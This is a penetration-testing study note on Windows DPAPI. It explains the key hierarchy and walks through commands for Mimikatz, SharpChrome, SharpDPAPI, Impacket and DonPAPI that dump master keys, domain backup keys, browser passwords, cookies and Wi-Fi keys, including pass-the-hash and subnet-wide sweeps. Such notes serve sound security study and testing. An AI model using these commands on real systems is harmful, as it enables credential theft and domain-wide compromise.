---
created: 2026-03-06
tags:
  - Windows
  - Windows_credential_dumping
  - password_attacks
---
### Table of contents

- [[#About Windows DPAPI]]
	- [[#How DPAPI works (in a nutshell)]]
- [[#Enumerating credentials]]
	- [[#Master key files]]
	- [[#Credential files]]
	- [[#Browser data]]
	- [[#Wi-Fi Profiles]]
	- [[#Seatbelt]]
- [[#Dumping master keys]]
	- [[#Extracting cached master keys from LSASS memory]]
	- [[#Deriving DPAPI pre-key manually]]
	- [[#Decrypting master keys with the user's password]]
	- [[#Extracting backup keys]]
- [[#Decrypting DPAPI blobs]]
	- [[#Decrypting raw blobs]]
	- [[#Decrypting Credential Manager files]]
	- [[#Dumping browser credentials]]
	- [[#SharpChrome]]
	- [[#SharpDPAPI]]
- [[#Dumping DPAPI credentials remotely]]
	- [[#Impacket's dpapi.py]]
	- [[#DonPAPI]]
- [[#References and further reading]]
## About Windows DPAPI

>**DPAPI (Data Protection API)** is a Windows-native cryptographic API that applications can call to encrypt and decrypt sensitive data without having to manage encryption keys themselves.

- Microsoft introduced DPAPI back in **Windows 2000**, and it's been quietly protecting (and betraying) secrets ever since.

DPAPI is used by a wide range of applications and Windows subsystems to protect sensitive data stored on disk:

- **Google Chrome, Microsoft Edge**, and other **Chromium-based browsers** use DPAPI to encrypt saved passwords, cookies, and payment data.
- The Windows **[[Credential Manager]]** relies on DPAPI to encrypt saved network credentials, RDP credentials, and generic application passwords.
- **Microsoft Outlook** uses DPAPI to encrypt S/MIME certificates and certain account credentials.
- **Wi-Fi profiles** store PSKs (pre-shared keys) encrypted with DPAPI inside the XML profile files.
- **Saved RDP connection credentials (`.rdp` files)** are often encrypted with DPAPI.
- The **.NET framework** exposes DPAPI functionality through the `System.Security.Cryptography.ProtectedData` class.
- The **Windows OpenSSH agent** can encrypt stored SSH private keys using DPAPI.
- And more.

In practice, getting your hands on DPAPI keys often means you get access to most user secrets they store.

### How DPAPI works (in a nutshell)

- DPAPI exposes two functions: 
	- [`CryptProtectData()`](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata) to encrypt data,
	- [`CryptUnprotectData()`](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata) to decrypt it.

>[!note] DPAPI does not store application data itself. It simply receives plaintext and returns encrypted data (stored as **DPAPI blobs**), or conversely.

DPAPI does **not encrypt application data directly with the user’s password**. Instead, it relies on a layered key hierarchy — user credentials protect a single secret, but the actual encrypted keys are generated and managed by Windows.


```mermaid
flowchart
n2["**User password**"]
n1@{ label: "Rectangle" }
n2 --- n1["**DPAPI Pre-Key**<br>(derived from logon secret + SID)"]
n3@{ label: "Rectangle" }
n1 --- n3["**Decrypts Master Key file**<br>(random secret stored on disk)"]
n3 --- n4["**Master Key**"]
n4 --- n5["Derived **Session Keys**"]
n5 --- n6["Encrypt **DPAPI blobs**"]
```


- Windows first derives a **logon credential hash** from the user's password (historically SHA-1 for local accounts).
- This hash is combined with the user's **SID** and passed through the [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) key derivation function (with 4000-8000 iterations depending on the Windows version) to produce the **DPAPI pre-key**.
- The **DPAPI pre-key** is used to encrypt and decrypt the **Master Key file** — a randomly-generated secret stored on disk.
- Windows combines the Master Key with random values stored in the DPAPI blob to derive **temporary session keys**.
- These session keys are what actually used to encrypt and decrypt the protected data.

>[!important]+ **Master keys** are typically **512-bit (64-byte)** randomly-generated secrets stored under the user's profile. 
>- Each key file is encrypted and decrypted with the **DPAPI pre-key**, derived from the user's password and SID.
> - Master key files are named after their GUID and stored under:
> 
> ```powershell
> C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>
> ```
>- Keys are rotated roughly every **90 days**, but the older ones are retained so previously encrypted data can still be decrypted. You'll often see a directory full of GUIDs; all of these keys may be needed depending on when a given blob was created.
>- Key files are marked **hidden** — always use `-Hidden` in `Get-ChildItem` to see them.

>The data encrypted with DPAPI is stored in **DPAPI blobs** — data structures returned by the [`CryptProtectData()`](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata) API function.

- Besides the ciphertext itself, the blob data structure contains:
	- The **GUID of the master key**.
	- The **salt** *used to compute the session key* — random data generated during encryption.
	- The **symmetric encryption algorithm** used to encrypt the data and the **hash algorithm** used for integrity and key derivation.

>[!bug] If you have a user's master key, you can decrypt every DPAPI-protected secret that was encrypted with that key.

>[!bug] If you have a user's password, you can derive the DPAPI pre-key and decrypt master keys yourself and use it to decrypt the master key files.

## Enumerating credentials
### Master key files

- Master key files are named by GUID and stored under the user's profile:

```powershell
# primary location
C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\

# secondary location — usually empty, but worth checking
C:\Users\<user>\AppData\Local\Microsoft\Protect\<SID>\
```

>[!note]+ Windows stores DPAPI master keys in the **`Roaming`** profile so they follow the user across machines in domain environments.
>- The `Local` path exists but is almost always empty.

- Additional locations matter when you're targeting system-level and service-account master keys:

```powershell
# SYSTEM / machine-level master keys:
C:\Windows\System32\Microsoft\Protect\S-1-5-18\

# service account master keys:
C:\Windows\System32\config\systemprofile\AppData\
C:\Windows\System32\config\LocalService\AppData\
C:\Windows\System32\config\LocalService\AppData\
```

>[!important] **Machine-level master keys** are encrypted using a key derived from the **system boot key** rather than a user password.

>[!important] Master Key files are **hidden** — always use `-Hidden` to see them.

- Enumerate keys for a specific user:

```powershell
Get-ChildItem -Hidden C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>
```

```powershell
Get-ChildItem -Hidden C:\Users\<user>\AppData\Local\Microsoft\Protect\<SID>
```

- Enumerate machine-level master keys:

```powershell
Get-ChildItem -Hidden C:\Windows\System32\Microsoft\Protect\S-1-5-18\
```

- Enumerate keys for all users, recursively:

```powershell
Get-ChildItem -Recurse -Hidden C:\Users\*\AppData\Roaming\Microsoft\Protect\ 2>$null
```

### Credential files

- DPAPI blocks written by [[Credential Manager]] live under:

```powershell
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
C:\Users\<user>\AppData\Local\Microsoft\Credentials\
```

- To enumerate credentials for the current user, use the [`cmdkey`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command:

```powershell
cmdkey /list
```

- You may also try to retrieve credentials using [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s  `sekurlsa::credman`, but this requires `SeDebugPrivilege`.

>[!note]+ To learn more about Windows Credential Manager and how to dump credentials it stores, se [[Credential Manager]].

- Credential Vaults can be found under:

```powershell
# user vault:
C:\Users\<USER>\AppData\Local\Microsoft\Vault\

# ystem-wide vault:
C:\ProgramData\Microsoft\Vault\
```
### Browser data

Chromium-based browsers store credential databases as **SQLite files**. The password values inside are DPAPI-encrypted.

- Google Chrome:

```powershell
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Local State
```

- Microsoft Edge:

```powershell
C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
```

- Brave: 

```powershell
C:\Users\<user>\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data
```

>[!tip]+
>- The `Login Data` file is a SQLite database. The passwords inside are encrypted DPAPI blobs. 
>- The `Local State` file contains an `encrypted_key` field — a DPAPI-protected AES key used in newer Chromium versions.

### Wi-Fi Profiles

PSKs live in the wireless profile XMLs — accessible directly if you have admin rights, or via `netsh` from any elevated context.

- Raw Wi-Fi Profile files are stored under:

```powershell
C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<interface_GUID>
```

- Dump via `netsh`:

```powershell
netsh wlan show profiles
```

```powershell
netsh wlan export profile name="<SSID>" folder=C:\Temp key=clear
```

>[!note] Exported XML files contain PSKs in plaintext under `<keyMaterial>`. If you are already admin, `netsh` handles the decryption.
### Seatbelt

**[`Seatbelt`](https://github.com/GhostPack/Seatbelt)** is one of the fastest ways to enumerate DPAPI secrets system-wide.

- Full user-context sweep:

```powershell
.\Seatbelt.exe -group=user
```

- Enumerate all master keys per user:

```powershell
.\Seatbelt.exe DpapiMasterKeys
```

- List credential blob files:

```powershell
.\Seatbelt.exe CredFiles
```

- List vault contents:

```powershell
.\Seatbelt.exe Vault 
```

- Detect installed Chromium browsers and profile paths:

```powershell
.\Seatbelt.exe ChromiumPresence 
```

## Dumping master keys

There several techniques you can use to obtain user's master keys:

- Use [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `sekurlsa::dpapi` to **extract cached master keys from LSASS memory for logged-in users** — just like you would do for other secrets (see [[LSASS memory]]). For this, you need `SYSTEM` or local Administrator with `SeDebugPrivilege`.
- If you have a user's password, you can **derive the DPAPI pre-key manually** and **use it to decrypt master key files**.
- In an AD environment, if you're currently authenticated as the target user, you can **ask the DC to decrypt the master key** for you using the backup decryption keys it stores.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `lsadump::backupkeys` to **retrieve the domain's recovery key**.

>[!tip] [Mimikatz](https://github.com/gentilkiwi/mimikatz) is the primary tool for local DPAPI operations. The `dpapi` module handles everything from master keys to credential dumping. 
### Extracting cached master keys from LSASS memory

When a user logs on, Windows decrypts their master keys and them in LSASS memory. This cache persists for the duration of the logon session.

If you have `SYSTEM` or local Administrator with `SeDebugPrivilege`, you can use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `sekurlsa::dpapi` module to extract cached credentials:

1. Request `SeDebugPrivilege` using `privilege::debug`:

```powershell
privilege::debug
```

2. Use the `sekurlsa::dpapi` module to extract master keys from the LSASS memory it can find:

```powershell
sekurlsa::dpapi
```

The output lists every cached master key by GUID and raw 64-byte hex value.

>[!note] To learn more about dumping LSASS memory, see [[LSASS memory]].

### Deriving DPAPI pre-key manually

If you know the user's plaintext password, you can use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `dpapi::masterkey` module to derive the DPAPI pre-key and then use it to decrypt master key files:

```powershell
dpapi::masterkey /in:"C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /sid:<user_SID> /password:<password> /protected
```

- `/in`: The path to the master key.
- `/sid`: The SID of the target user. 
- `/password`: The target user's plaintext password (not NT hash).
- `/protected`: Defines the user account as a protected one.

>[!tip]+
> - Get the user's SID:
> 
> ```powershell
> wmic useraccount where name='<user>' get sid
> ```
> 
> - For the current user:
> 
> ```powershell
> whoami /user
> ```

### Decrypting master keys with the user's password

>[!note] This one is specific to domain environments. 

- So, the master key is encrypted with a DPAPI pre-key derived from the user's password. 
- But if the user **forgets their password** and resets it with an Administrator's help or from another device, **the master keys encrypted with a pre-key derived from that lost password are gone**. And therefore all DPAPI blobs protected by this master key are gone too.

Microsoft solves this by creating **backup keys** and storing them on the DC.

>In Active Directory environments, the **DPAPI Backup keys** are randomly generated when the domain is created and stored on the DCs, encrypted with the domain key.

The DPAPI backup key pair is an asymmetric key pair where the **public key** is shared to clients, and the private key is stored on DCs.

- So, on a Windows machine, there are two copies of a DPAPI master key: one encrypted with the DPAPI pre-key derived from a user's password, and another, encrypted using the **domain backup public key**.

```mermaid
flowchart
	n1["DPAPI Master Key"]
	n1 --- n2["**Encrypted with a DPAPI pre-key** <br>(normal usage)"]
	n1["**DPAPI Master Key**"] --- n3["**Encrypted with domain backup public key**<br>(recovery mechanism)"]
```

- When your old password is lost and you need to recover master keys, Windows would use **[MS-BKRP (BackupKey Remote Protocol)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/90b08be4-5175-4177-b4ce-d920d797e3a8)** to talk to the DC. This protocol allows a client to ask a DC to wrap (encrypt) secrets and unwrap them (decrypt).
- It works over **RPC** using authenticated connections between the client and the domain controller.

This means that:

>[!bug] If you are already authenticated as the user who's master keys you target, it’s possible to ask the DC for the **backup key to decrypt the master keys using RPC (MS-BKRP)**.

- If you're currently authenticated as the target user, you can use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `dpapi::masterkey` module to ask the DC to decrypt a master key on your behalf:

```powershell
dpapi::masterkey /in:"C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /rpc
```

- `/in`: The path to the master key.
- `/rpc`: Can be used to remotely decrypt the master key of the target user by contacting the DC's RPC Service. 

>[!warning] Your authentication context must match the owner of the key you're trying to decrypt —  the DC will refuse the request otherwise.
### Extracting backup keys

- Instead of asking the DC to decrypt specific master keys, you can ask it for the **backup private key** it uses to do that — and then you'll be able to decrypt any master keys on the system yourself. Though this requires **Domain Admin**.

Once you have enough privileges, [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `lsadump::backupkeys` module comes helpful:

1. Request `SeDebugPrivilege` using `privilege::debug`:

```powershell
privilege::debug
```

2. Use `lsadump::backupkeys` to dump the backup key from the DC:

```powershell
lsadump::backupkeys /system:<DC> /export
```

- `/system`: The target DC's hostname.
- `/export`: Export the output as `.pvk` (*private key*).

This produces a `.pvk` file (e.g., `ntds_capi_0_<GUID>.pvk`) in your current directory. It doesn't rotate unless an administrator explicitly regenerates it, and it works against every user in the domain.

Once you have it, decrypt any user's master key without their password:

```powershell
dpapi::masterkey /in:"C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /pvk:ntds_capi_0_<GUID>.pvk
```

- `/in`: The path to the master key.
- `/pvk`: The path to the private key file.

## Decrypting DPAPI blobs

With a master key in hand (from any of the four paths above), you can now decrypt the actual credential material. For this, you would likely use one of [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `dpapi` modules, depending on what you're decrypting. 

### Decrypting raw blobs

- To decrypt raw DPAPI blobs, use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `dpapi::blob` module:

```powershell
dpapi::blob /in:dpapi_blob.txt /unprotect /masterkey:<masterkey>
```

- `/in`: The path to the blob file.
- `/unprotect`: Display the decryption results on screen.
- `/masterkey`: The master key to use for decryption.

>[!note] A **raw DPAPI blob** you would decrypt with `dpapi::blob` is the direct output of `CryptProtectData()` — just ciphertext with a header containing the master key GUID and salt. Many applications store their secrets this way.

### Decrypting Credential Manager files

- To decrypt credential files from Windows Credential Manager (the unnamed blobs under `\Credentials\`, e.g, `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\`), use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `dpapi::cred` module:

```powershell
dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<credential_file> /masterkey:<masterkey>
```

- `/in`: The path to the credential file to decrypt.
- `/masterkey`: The master key to use for decryption.

### Dumping browser credentials

- To decrypt credentials from Chromium-based browsers encrypted with DPAPI, you can use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `dpapi::chrome` module:

```powershell
dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:<MASTER_KEY>
```

- `/in`: The path to the file to decrypt.
- `/masterkey`: The master key to use for decryption.

>[!interesting]+ Chrome encryption before and after `v80`
>- **Pre-Chrome 80**
>	- Each saved password was individually encrypted as a DPAPI blob and stored directly in the `Login Data` SQLite database. 
>	- You hand Mimikatz the master key and it decrypts passwords one by one.
> 
>- **Chrome 80+**
>	- Google added an extra AES-256 layer. 
>	- During browser startup, Chrome calls `CryptUnprotectData()` on the `os_crypt.encrypted_key` value stored in `Local State` — this gives it a runtime AES key held only in memory. 
>	- Individual passwords in `Login Data` are then encrypted with that AES key (with an `v10` prefix in the ciphertext). 
>	- To decrypt offline, you need to first unwrap the `encrypted_key` from `Local State` using DPAPI, then use that AES key to decrypt the individual password entries.
> 
> `Mimikatz`'s `dpapi::chrome` handles both cases when given the right master key. 

### SharpChrome

Alternatively, you can use [`SharpChrome`](https://github.com/GhostPack/SharpDPAPI) — it handles Chrome 80+ decryption chain more cleanly than `Mimikatz` and doesn't require debug privilege if you're already running as the target user

- Dump all Chrome login:

```powershell
.\SharpChrome.exe logins /masterkey:<MASTER_KEY>
```

- Also dump cookies:

```powershell
.\SharpChrome.exe cookies /masterkey:<MASTER_KEY>
```

- If running as the target user with no master key, try:

```powershell
.\SharpChome.exe logins
```

### SharpDPAPI

[`SharpDPAPI`](https://github.com/GhostPack/SharpDPAPI) goes broader — it dumps credentials, certificates, browser data, and vault secrets in a single pass. Useful when you're running as the target user and want to pull everything at once:


- Derive keys from current context (running as target user)

```powershell
.\SharpDPAPI.exe credentials
.\SharpDPAPI.exe vault
```

- With an explicit master key:

```powershell
.\SharpDPAPI.exe credentials /masterkey:<KEY>
```

- Triage mode — enumerate everything without decrypting (fast recon):

```powershell 
.\SharpDPAPI.exe triage
```
## Dumping DPAPI credentials remotely

When you're working from a Linux attack host and want to avoid dropping tools on the target, [Impacket](https://github.com/SecureAuthCorp/impacket) and [`DonPAPI`](https://github.com/login-securite/DonPAPI) cover most of the same ground (but you would first need to copy the target files to your machine; see [[Linux_file_transfers]] and [[Windows_file_transfers]]).

### Impacket's dpapi.py

- If you know the target user's password and have already pulled a master key file to your machine, you can use [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`dpapi.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py)  to decrypt it:

```bash
dpapi.py masterkey -file "master_key.txt" -sid <user_sid> -password <password> 
```

The script derives the DPAPI key from the user's password and decrypts the master key locally.

- With this same script, if you have Domain Admin credentials, you can authenticate to a Domain Controller and retrieve the **domain DPAPI backup key**:
```bash
dpapi.py backupkeys -t <domain>/<user>:<password>@<target>
```

- The exported `.pvk` key can then decrypt any user's DPAPI master key:

```bash
dpapi.py masterkey -file "master_key.txt" -pvk "backupkey.pvk"
```

### DonPAPI

>[`DonPAPI`](https://github.com/login-securite/DonPAPI) can be used to remotely extract a user's DPAPI secrets. It automates the entire DPAPI extraction chain — retrieves files via SMB, decrypts master keys (using a pre-key it derives based on the user password you provide), and dumps credentials in one shot. It also supports [[Pass-the-Hash]], [[Pass-the-Ticket]], and similar attacks.

- Extract credentials:

```bash
DonPAPI.py '<domain>/<username>:<password>@<target>'
```

- Authenticate using [[Pass-the-Hash]]:

```bash
DonPAPI.py '<domain>/<username>@<target>' -hashes :<NT_hash>
```

- Authenticate using [[Pass-the-Ticket]]:

```bash
KRB5CCNAME=/path/to/ticket.ccache DonPAPI.py -k -no-pass '<domain>/<username>@<target>'
```

- Sweep entire subnet — useful for full environment coverage once you get the Domain Admin:

```bash
DonPAPI.py '<domain>/<username>:<password>@192.168.1.0/24'
```
## References and further reading

- [`Data Prorection API — Wikipedia`](https://en.wikipedia.org/wiki/Data_Protection_API)
- [`DPAPI secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
- [`DPAPI - Extracting Passwords — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)
- [`Windows - DPAPI — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/)

- [`Reading DPAPI Protected Blobs — Tom O'Neill, Medium`](https://medium.com/@toneillcodes/decoding-dpapi-blobs-1ed9b4832cf6)

- [`DPAPI backup keys on Active Directory domain controllers — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi-backup-keys-on-ad-domain-controllers)

- [`[MS-BKRP]: BackupKey Remote Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/90b08be4-5175-4177-b4ce-d920d797e3a8)
